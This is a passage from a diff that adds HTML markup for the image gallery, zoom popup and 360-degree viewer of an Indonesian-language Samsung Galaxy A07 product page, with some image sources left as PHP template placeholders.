+               <img alt="Galaxy A07 BackR30 Black " class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603112?$Q90_1920_1280_F_PNG$" data-mobile-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603112?$Q90_1248_936_F_PNG$" role="img"/>
+              </div>
+             </a>
+            </li>
+            <li class="hdd02-gallery__item swiper-slide" data-type-headline="Galaxy A07 Front2 Black ">
+             <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_product info.-product detail-gallery module-gallery" class="hdd02-gallery__image" data-js-action="openPcGalleryPopup" href="javascript:void(0);">
+              <div class="image">
+               <img alt="Galaxy A07 Front2 Black " class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603113?$Q90_1920_1280_F_PNG$" data-mobile-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603113?$Q90_1248_936_F_PNG$" role="img"/>
+              </div>
+             </a>
+            </li>
+            <li class="hdd02-gallery__item swiper-slide" data-type-headline="Galaxy A07 FrontL30 Black ">
+             <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_product info.-product detail-gallery module-gallery" class="hdd02-gallery__image" data-js-action="openPcGalleryPopup" href="javascript:void(0);">
+              <div class="image">
+               <img alt="Galaxy A07 FrontL30 Black " class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603114?$Q90_1920_1280_F_PNG$" data-mobile-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603114?$Q90_1248_936_F_PNG$" role="img"/>
+              </div>
+             </a>
+            </li>
+            <li class="hdd02-gallery__item swiper-slide" data-type-headline="Galaxy A07 FrontR30 Black ">
+             <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_product info.-product detail-gallery module-gallery" class="hdd02-gallery__image" data-js-action="openPcGalleryPopup" href="javascript:void(0);">
+              <div class="image">
+               <img alt="Galaxy A07 FrontR30 Black " class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603115?$Q90_1920_1280_F_PNG$" data-mobile-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603115?$Q90_1248_936_F_PNG$" role="img"/>
+              </div>
+             </a>
+            </li>
+            <li class="hdd02-gallery__item swiper-slide" data-type-headline="Galaxy A07 Lside Black ">
+             <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_product info.-product detail-gallery module-gallery" class="hdd02-gallery__image" data-js-action="openPcGalleryPopup" href="javascript:void(0);">
+              <div class="image">
+               <img alt="Galaxy A07 Lside Black " class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603116?$Q90_1920_1280_F_PNG$" data-mobile-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603116?$Q90_1248_936_F_PNG$" role="img"/>
+              </div>
+             </a>
+            </li>
+            <li class="hdd02-gallery__item swiper-slide" data-type-headline="Galaxy A07 Rside Black ">
+             <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_product info.-product detail-gallery module-gallery" class="hdd02-gallery__image" data-js-action="openPcGalleryPopup" href="javascript:void(0);">
+              <div class="image">
+               <img alt="Galaxy A07 Rside Black " class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603117?$Q90_1920_1280_F_PNG$" data-mobile-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603117?$Q90_1248_936_F_PNG$" role="img"/>
+              </div>
+             </a>
+            </li>
+           </ul>
+           <div class="screen-indicator-wrap">
+            <button class="screen-indicator screen-indicator--prev">
+             <div class="screen-indicator--icon">
+              <span class="hidden">
+               Sebelumnya
+              </span>
+              <svg aria-hidden="true" class="icon" focusable="false">
+               <use href="#previous-regular" xlink:href="#previous-regular">
+               </use>
+              </svg>
+             </div>
+            </button>
+            <button class="screen-indicator screen-indicator--next">
+             <div class="screen-indicator--icon">
+              <span class="hidden">
+               Berikutnya
+              </span>
+              <svg aria-hidden="true" class="icon" focusable="false">
+               <use href="#next-regular" xlink:href="#next-regular">
+               </use>
+              </svg>
+             </div>
+            </button>
+           </div>
+          </div>
+          <div class="progressbar-indicator">
+           <div class="progressbar-indicator__inner">
+            <div class="progressbar-indicator__bar">
+             <span class="progressbar-indicator__bar-fill">
+             </span>
+            </div>
+            <div class="progressbar-indicator__arrow-wrap">
+             <button class="progressbar-indicator__arrow swiper-button-prev">
+              <span class="hidden">
+               Sebelumnya
+              </span>
+              <svg aria-hidden="true" class="icon" focusable="false" height="40" viewbox="0 0 40 40" width="40">
+               <g transform="translate(40 40) rotate(180)">
+                <path d="M21.47,16.53A.75.75,0,0,1,22.53,15.47l4,4a.75.75,0,0,1,0,1.061l-4,4A.75.75,0,0,1,21.47,23.47l2.72-2.72H14.5a.75.75,0,0,1,0-1.5h9.689Z">
+                </path>
+               </g>
+              </svg>
+             </button>
+             <button class="progressbar-indicator__arrow swiper-button-next">
+              <span class="hidden">
+               Berikutnya
+              </span>
+              <svg aria-hidden="true" class="icon" focusable="false" height="40" viewbox="0 0 40 40" width="40">
+               <path d="M21.47,16.53A.75.75,0,0,1,22.53,15.47l4,4a.75.75,0,0,1,0,1.061l-4,4A.75.75,0,0,1,21.47,23.47l2.72-2.72H14.5a.75.75,0,0,1,0-1.5h9.689Z">
+               </path>
+              </svg>
+             </button>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div class="hdd02-gallery__thumbnail">
+          <ul class="hdd02-gallery__thumbnail-list" role="list">
+           <li class="hdd02-gallery__thumbnail-item" role="listitem">
+            <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_gallery-product detail-gallery module-gallery" class="hdd02-gallery__thumbnail-item-image" data-js-action="openPcGalleryPopup" href="javascript:void(0);" role="button">
+             <div class="image">
+              <img alt="Galaxy A07 Front Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+             </div>
+            </a>
+           </li>
+           <li class="hdd02-gallery__thumbnail-item" role="listitem">
+            <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_gallery-product detail-gallery module-gallery" class="hdd02-gallery__thumbnail-item-image" data-js-action="openPcGalleryPopup" href="javascript:void(0);" role="button">
+             <div class="image">
+              <img alt="Galaxy A07 Back Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+             </div>
+            </a>
+           </li>
+           <li class="hdd02-gallery__thumbnail-item" role="listitem">
+            <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_gallery-product detail-gallery module-gallery" class="hdd02-gallery__thumbnail-item-image" data-js-action="openPcGalleryPopup" href="javascript:void(0);" role="button">
+             <div class="image">
+              <img alt="Galaxy A07 BackL30 Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+             </div>
+            </a>
+           </li>
+           <li class="hdd02-gallery__thumbnail-item" role="listitem">
+            <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_gallery-product detail-gallery module-gallery" class="hdd02-gallery__thumbnail-item-image" data-js-action="openPcGalleryPopup" href="javascript:void(0);" role="button">
+             <div class="image">
+              <img alt="Galaxy A07 BackR30 Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+             </div>
+            </a>
+           </li>
+           <li class="hdd02-gallery__thumbnail-item" role="listitem">
+            <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_gallery-product detail-gallery module-gallery" class="hdd02-gallery__thumbnail-item-image" data-js-action="openPcGalleryPopup" href="javascript:void(0);" role="button">
+             <div class="image">
+              <img alt="Galaxy A07 Front2 Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+             </div>
+            </a>
+           </li>
+           <li class="hdd02-gallery__thumbnail-item" role="listitem">
+            <a an-ac="view more" an-ca="indication" an-la="product gallery:view more" an-tr="hdd02_gallery-product detail-view more-indication" class="hdd02-gallery__thumbnail-item-text" data-js-action="openPcGalleryPopup" href="javascript:void(0);" role="button">
+             <span class="text">
+              +4 lebih banyak
+             </span>
+            </a>
+           </li>
+          </ul>
+         </div>
+         <div class="hdd02-gallery__cta">
+         </div>
+         <div class="hdd02-gallery__popup type-gallery">
+          <div class="layer-popup">
+           <div class="layer-popup__contents">
+            <div class="hdd02-gallery__popup-thumbnail scrollbar">
+             <div class="scrollbar__contents">
+              <div class="hdd02-gallery__popup-image">
+               <ul class="hdd02-gallery__popup-image-list" role="list">
+                <li class="hdd02-gallery__popup-image-item" role="listitem">
+                 <a an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image" an-tr="hdd02_gallery-product detail-gallery image-gallery" class="hdd02-gallery__popup-image-link" data-js-action="changePcGalleryPopup" href="javascript:void(0);" role="button">
+                  <div class="image">
+                   <img alt="Galaxy A07 Front Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </a>
+                </li>
+                <li class="hdd02-gallery__popup-image-item" role="listitem">
+                 <a an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image" an-tr="hdd02_gallery-product detail-gallery image-gallery" class="hdd02-gallery__popup-image-link" data-js-action="changePcGalleryPopup" href="javascript:void(0);" role="button">
+                  <div class="image">
+                   <img alt="Galaxy A07 Back Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </a>
+                </li>
+                <li class="hdd02-gallery__popup-image-item" role="listitem">
+                 <a an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image" an-tr="hdd02_gallery-product detail-gallery image-gallery" class="hdd02-gallery__popup-image-link" data-js-action="changePcGalleryPopup" href="javascript:void(0);" role="button">
+                  <div class="image">
+                   <img alt="Galaxy A07 BackL30 Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </a>
+                </li>
+                <li class="hdd02-gallery__popup-image-item" role="listitem">
+                 <a an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image" an-tr="hdd02_gallery-product detail-gallery image-gallery" class="hdd02-gallery__popup-image-link" data-js-action="changePcGalleryPopup" href="javascript:void(0);" role="button">
+                  <div class="image">
+                   <img alt="Galaxy A07 BackR30 Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </a>
+                </li>
+                <li class="hdd02-gallery__popup-image-item" role="listitem">
+                 <a an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image" an-tr="hdd02_gallery-product detail-gallery image-gallery" class="hdd02-gallery__popup-image-link" data-js-action="changePcGalleryPopup" href="javascript:void(0);" role="button">
+                  <div class="image">
+                   <img alt="Galaxy A07 Front2 Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </a>
+                </li>
+                <li class="hdd02-gallery__popup-image-item" role="listitem">
+                 <a an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image" an-tr="hdd02_gallery-product detail-gallery image-gallery" class="hdd02-gallery__popup-image-link" data-js-action="changePcGalleryPopup" href="javascript:void(0);" role="button">
+                  <div class="image">
+                   <img alt="Galaxy A07 FrontL30 Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </a>
+                </li>
+                <li class="hdd02-gallery__popup-image-item" role="listitem">
+                 <a an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image" an-tr="hdd02_gallery-product detail-gallery image-gallery" class="hdd02-gallery__popup-image-link" data-js-action="changePcGalleryPopup" href="javascript:void(0);" role="button">
+                  <div class="image">
+                   <img alt="Galaxy A07 FrontR30 Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </a>
+                </li>
+                <li class="hdd02-gallery__popup-image-item" role="listitem">
+                 <a an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image" an-tr="hdd02_gallery-product detail-gallery image-gallery" class="hdd02-gallery__popup-image-link" data-js-action="changePcGalleryPopup" href="javascript:void(0);" role="button">
+                  <div class="image">
+                   <img alt="Galaxy A07 Lside Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </a>
+                </li>
+                <li class="hdd02-gallery__popup-image-item" role="listitem">
+                 <a an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image" an-tr="hdd02_gallery-product detail-gallery image-gallery" class="hdd02-gallery__popup-image-link" data-js-action="changePcGalleryPopup" href="javascript:void(0);" role="button">
+                  <div class="image">
+                   <img alt="Galaxy A07 Rside Black " class="image__main lazy-load" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </a>
+                </li>
+               </ul>
+              </div>
+             </div>
+            </div>
+            <div class="hdd02-gallery__popup-vertical scrollbar">
+             <div class="scrollbar__contents">
+              <div class="hdd02-gallery__popup-vertical-content">
+               <div class="hdd02-gallery__popup-vertical-image">
+                <div class="image-content">
+                 <div class="default-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 Front Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </div>
+                 <div class="zoom-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 Front Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                  <p aria-hidden="true" class="snackbar">
+                   Klik atau ketuk untuk memperkecil
+                  </p>
+                 </div>
+                </div>
+                <div class="image-content">
+                 <div class="default-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 Back Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </div>
+                 <div class="zoom-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 Back Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                  <p aria-hidden="true" class="snackbar">
+                   Klik atau ketuk untuk memperkecil
+                  </p>
+                 </div>
+                </div>
+                <div class="image-content">
+                 <div class="default-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 BackL30 Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </div>
+                 <div class="zoom-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 BackL30 Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                  <p aria-hidden="true" class="snackbar">
+                   Klik atau ketuk untuk memperkecil
+                  </p>
+                 </div>
+                </div>
+                <div class="image-content">
+                 <div class="default-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 BackR30 Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </div>
+                 <div class="zoom-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 BackR30 Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                  <p aria-hidden="true" class="snackbar">
+                   Klik atau ketuk untuk memperkecil
+                  </p>
+                 </div>
+                </div>
+                <div class="image-content">
+                 <div class="default-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 Front2 Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </div>
+                 <div class="zoom-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 Front2 Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                  <p aria-hidden="true" class="snackbar">
+                   Klik atau ketuk untuk memperkecil
+                  </p>
+                 </div>
+                </div>
+                <div class="image-content">
+                 <div class="default-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 FrontL30 Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </div>
+                 <div class="zoom-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 FrontL30 Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                  <p aria-hidden="true" class="snackbar">
+                   Klik atau ketuk untuk memperkecil
+                  </p>
+                 </div>
+                </div>
+                <div class="image-content">
+                 <div class="default-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 FrontR30 Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </div>
+                 <div class="zoom-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 FrontR30 Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                  <p aria-hidden="true" class="snackbar">
+                   Klik atau ketuk untuk memperkecil
+                  </p>
+                 </div>
+                </div>
+                <div class="image-content">
+                 <div class="default-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 Lside Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </div>
+                 <div class="zoom-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 Lside Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                  <p aria-hidden="true" class="snackbar">
+                   Klik atau ketuk untuk memperkecil
+                  </p>
+                 </div>
+                </div>
+                <div class="image-content">
+                 <div class="default-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 Rside Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                 </div>
+                 <div class="zoom-image">
+                  <div class="image">
+                   <img alt="Galaxy A07 Rside Black " class="image__main lazy-load-man" data-comp-name="image" data-src="<?= $image; ?>" role="img"/>
+                  </div>
+                  <p aria-hidden="true" class="snackbar">
+                   Klik atau ketuk untuk memperkecil
+                  </p>
+                 </div>
+                </div>
+               </div>
+              </div>
+              <div class="hdd02-gallery__popup-control hdd02-gallery__popup-control--hide">
+               <ul class="hdd02-gallery__popup-control-list" role="list">
+                <li class="hdd02-gallery__popup-control-item" role="listitem">
+                 <button an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image zoom in" an-tr="hdd02_gallery-product detail-gallery module-gallery" class="hdd02-gallery__popup-control-button plus" data-image-control="zoomIn">
+                  <svg aria-hidden="true" class="icon" focusable="false" viewbox="0 0 24 24">
+                   <path d="M4.081 3.831a11.375 11.375 0 1 1 0 16.087 11.376 11.376 0 0 1 0-16.087zm15.2.884a10.125 10.125 0 1 0 0 14.319 10.126 10.126 0 0 0 0-14.319zm-6.785.66v5.875h5.875V12.5H12.5v5.875h-1.25V12.5H5.374V11.25h5.875V5.375z">
+                   </path>
+                  </svg>
+                 </button>
+                </li>
+                <li class="hdd02-gallery__popup-control-item" role="listitem">
+                 <button an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image zoom out" an-tr="hdd02_gallery-product detail-gallery module-gallery" class="hdd02-gallery__popup-control-button minus" data-image-control="zoomOut" disabled="">
+                  <svg aria-hidden="true" class="icon" focusable="false" viewbox="0 0 24 24">
+                   <path d="M19 11.875H5.247" fill="none" stroke="currentColor" stroke-width="1.251">
+                   </path>
+                   <path d="M12.124 1.126a10.749 10.749 0 1 1-7.6 3.148 10.717 10.717 0 0 1 7.6-3.148z" fill="none" fill-rule="evenodd" stroke="currentColor" stroke-width="1.251">
+                   </path>
+                  </svg>
+                 </button>
+                </li>
+               </ul>
+               <ul class="hdd02-gallery__popup-control-list control-hide" id="galleryMoving" role="list">
+                <li class="hdd02-gallery__popup-control-item" role="listitem">
+                 <button an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image zoom up" an-tr="hdd02_gallery-product detail-gallery module-gallery" class="hdd02-gallery__popup-control-button up" data-image-control="up">
+                  <span class="hidden">
+                   Move Thumbnail Image down
+                  </span>
+                  <svg aria-hidden="true" class="icon" focusable="false" height="20" viewbox="0 0 20 20" width="20">
+                   <path d="M9.4 19.642V3.633L3.233 9.949l-.682-.682L9.913 1.6l7.343 7.666-.712.682-6.1-6.3v15.994z">
+                   </path>
+                  </svg>
+                 </button>
+                </li>
+                <li class="hdd02-gallery__popup-control-item" role="listitem">
+                 <button an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image zoom down" an-tr="hdd02_gallery-product detail-gallery module-gallery" class="hdd02-gallery__popup-control-button down" data-image-control="down">
+                  <span class="hidden">
+                   Move Thumbnail Image up
+                  </span>
+                  <svg aria-hidden="true" class="icon" focusable="false" height="20" viewbox="0 0 20 20" width="20">
+                   <path d="M9.4 19.642V3.633L3.233 9.949l-.682-.682L9.913 1.6l7.343 7.666-.712.682-6.1-6.3v15.994z">
+                   </path>
+                  </svg>
+                 </button>
+                </li>
+                <li class="hdd02-gallery__popup-control-item" role="listitem">
+                 <button an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image zoom left" an-tr="hdd02_gallery--product detail-gallery module-gallery" class="hdd02-gallery__popup-control-button left" data-image-control="left">
+                  <span class="hidden">
+                   Move Thumbnail Image right
+                  </span>
+                  <svg aria-hidden="true" class="icon" focusable="false" height="20" viewbox="0 0 20 20" width="20">
+                   <path d="M9.4 19.642V3.633L3.233 9.949l-.682-.682L9.913 1.6l7.343 7.666-.712.682-6.1-6.3v15.994z">
+                   </path>
+                  </svg>
+                 </button>
+                </li>
+                <li class="hdd02-gallery__popup-control-item" role="listitem">
+                 <button an-ac="product gallery" an-ca="gallery" an-la="gallery popup:image zoom right" an-tr="hdd02_gallery-product detail-gallery module-gallery" class="hdd02-gallery__popup-control-button right" data-image-control="right">
+                  <span class="hidden">
+                   Move Thumbnail Image left
+                  </span>
+                  <svg aria-hidden="true" class="icon" focusable="false" height="20" viewbox="0 0 20 20" width="20">
+                   <path d="M9.4 19.642V3.633L3.233 9.949l-.682-.682L9.913 1.6l7.343 7.666-.712.682-6.1-6.3v15.994z">
+                   </path>
+                  </svg>
+                 </button>
+                </li>
+               </ul>
+              </div>
+             </div>
+            </div>
+            <button class="hdd02-gallery__popup-close" data-js-action="closeGalleryPopup">
+             <span class="hidden">
+              Close
+             </span>
+             <svg aria-hidden="true" class="icon" focusable="false">
+              <use href="#cancel-close-regular" xlink:href="#cancel-close-regular">
+              </use>
+             </svg>
+            </button>
+           </div>
+          </div>
+         </div>
+         <div class="hdd02-gallery__popup type-360view-new">
+          <div class="layer-popup">
+           <div class="layer-popup__contents">
+            <div class="scrollbar__contents">
+             <div class="seq-viewer-container">
+              <div class="top-container">
+               <p class="model-name">
+                Galaxy A07
+               </p>
+               
+               <button class="hdd02-gallery__popup-close" data-js-action="closeGalleryPopup">
+                <span class="hidden">
+                 Tutup
+                </span>
+                <svg aria-hidden="true" class="icon" focusable="false">
+                 <use href="#cancel-close-regular" xlink:href="#cancel-close-regular">
+                 </use>
+                </svg>
+               </button>
+              </div>
+              <div class="imgseq-container" id="seqContainer">
+               <div class="loading-container">
+                <div class="loading">
+                 <span class="progress">
+                  0%
+                 </span>
+                </div>
+               </div>
+               <div class="interaction-container">
+                <div class="interaction-icon">
+                 <svg height="58.617" viewbox="0 0 59.583 58.617" width="59.583" xmlns="http://www.w3.org/2000/svg">
+                  <g transform="translate(0.5 0.5)">
+                   <g transform="translate(0 32.736)">
+                    <g fill="rgba(0,0,0,0.24)" stroke="rgba(0,0,0,0.64)" stroke-width="1" transform="translate(13.353)">
+                     <circle cx="6.031" cy="6.031" r="6.031" stroke="none">
+                     </circle>
+                     <circle cx="6.031" cy="6.031" fill="none" r="5.531">
+                     </circle>
+                    </g>
+                    <path d="M-564.012,2412.855v11.527h11.524" fill="none" stroke="rgba(0,0,0,0.64)" stroke-width="1" transform="translate(564.012 -2399.502)">
+                    </path>
+                    <path d="M-549.086,2408.855l-15.166,15.166" fill="none" stroke="rgba(0,0,0,0.64)" stroke-width="1" transform="translate(564.252 -2399.14)">
+                    </path>
+                   </g>
+                   <g transform="translate(33.168)">
+                    <g fill="rgba(0,0,0,0.24)" stroke="rgba(0,0,0,0.64)" stroke-width="1" transform="translate(0 12.819)">
+                     <circle cx="6.031" cy="6.031" r="6.031" stroke="none">
+                     </circle>
+                     <circle cx="6.031" cy="6.031" fill="none" r="5.531">
+                     </circle>
+                    </g>
+                    <path d="M-552.488,2424.382v-11.527h-11.524" fill="none" stroke="rgba(0,0,0,0.64)" stroke-width="1" transform="translate(577.903 -2412.855)">
+                    </path>
+                    <path d="M-564.252,2424.021l15.166-15.166" fill="none" stroke="rgba(0,0,0,0.64)" stroke-width="1" transform="translate(574.501 -2408.855)">
+                    </path>
+                   </g>
+                  </g>
+                 </svg>
+                </div>
+               </div>
+               <div class="ui-container">
+                <div class="ui-wrap">
+                 <button aria-label="zoom in" class="btn-zoomin">
+                  <svg viewbox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                   <rect fill="rgba(255,255,255,0)" height="16" width="16">
+                   </rect>
+                   <path d="M7.333,0V6h6V7.333h-6v6H6v-6H0V6H6V0Z" transform="translate(1.333 1.333)">
+                   </path>
+                  </svg>
+                 </button>
+                 <button aria-label="zoom out" class="btn-zoomout">
+                  <svg viewbox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                   <rect fill="rgba(255,255,255,0)" height="16" width="16">
+                   </rect>
+                   <path d="M13.333,0V1.333H0V0Z" transform="translate(1.333 7.333)">
+                   </path>
+                  </svg>
+                 </button>
+                 <div class="divide">
+                 </div>
+                 <button aria-label="reset" class="btn-reset">
+                  <svg viewbox="0 0 16.001 16" xmlns="http://www.w3.org/2000/svg">
+                   <g transform="translate(0 16) rotate(-90)">
+                    <rect fill="none" height="16" transform="translate(0 0.001)" width="16">
+                    </rect>
+                    <path d="M253.312,407.75a7.842,7.842,0,0,0-10.222,2.186v-1.3h-1.333v3.917h3.917v-1.33h-1.832a6.5,6.5,0,1,1-.721,4.927l-.061-.241-1.3.32.091.346a7.88,7.88,0,0,0,3.677,4.775,7.786,7.786,0,0,0,3.878,1.039,7.882,7.882,0,0,0,2.069-.279,7.832,7.832,0,0,0,1.833-14.356Z" transform="translate(422.715 -241.757) rotate(90)">
+                    </path>
+                   </g>
+                  </svg>
+                 </button>
+                 <button aria-label="change type" class="btn-changetype">
+                  <span class="ico-change change-type-1 show">
+                   <svg viewbox="0 0 18.715 15.326" xmlns="http://www.w3.org/2000/svg">
+                    <g transform="translate(-15.281 -16.174)">
+                     <path d="M15.281,29.5H30.15v2H15.281Z">
+                     </path>
+                     <path d="M28.24,30.98l3.82-14.806,1.936.5L30.176,31.48Zm-7.776-5.632-2.5-2.5-1.031,1.031,3.535,3.535L24,23.875l-1.031-1.031Z">
+                     </path>
+                     <g>
+                      <path d="M23.509,17.519a4,4,0,0,0-4,4v4h2v-4a2,2,0,0,1,2-2h4v-2Z">
+                      </path>
+                     </g>
+                    </g>
+                   </svg>
+                  </span>
+                  <span class="ico-change change-type-2">
+                   <svg height="16.575" viewbox="0 0 18.715 16.575" width="18.715" xmlns="http://www.w3.org/2000/svg">
+                    <g transform="translate(-15.281 -14.925)">
+                     <path d="M15.281,29.5H30.15v2H15.281Z">
+                     </path>
+                     <path d="M28.24,30.98l3.82-14.806,1.936.5L30.176,31.48ZM26.769,18.46l-2.5,2.5L25.3,22l3.535-3.536L25.3,14.925l-1.031,1.031Z">
+                     </path>
+                     <path d="M23.509,17.519a4,4,0,0,0-4,4v4h2v-4a2,2,0,0,1,2-2h4v-2Z">
+                     </path>
+                    </g>
+                   </svg>
+                  </span>
+                 </button>
+                 <button aria-label="more" class="btn-more last">
+                  <svg viewbox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                   <g transform="translate(-169.748 -591)">
+                    <rect fill="none" height="16" transform="translate(169.748 591)" width="16">
+                    </rect>
+                    <g transform="translate(12.498 -1.25)">
+                     <circle cx="1.25" cy="1.25" r="1.25" transform="translate(158 599)">
+                     </circle>
+                     <circle cx="1.25" cy="1.25" r="1.25" transform="translate(164 599)">
+                     </circle>
+                     <circle cx="1.25" cy="1.25" r="1.25" transform="translate(170 599)">
+                     </circle>
+                    </g>
+                   </g>
+                  </svg>
+                 </button>
+                </div>
+                <div class="pos-container">
+                 <div class="toggle-container">
+                  <div class="toggle-wrap">
+                   <label for="toggle-dimension">
+                    Dimension
+                   </label>
+                   <input autocomplete="off" class="toggle btn-toggle-dimension" id="toggle-dimension" type="checkbox"/>
+                  </div>
+                  <button aria-label="close layer" class="btn-close-pos">
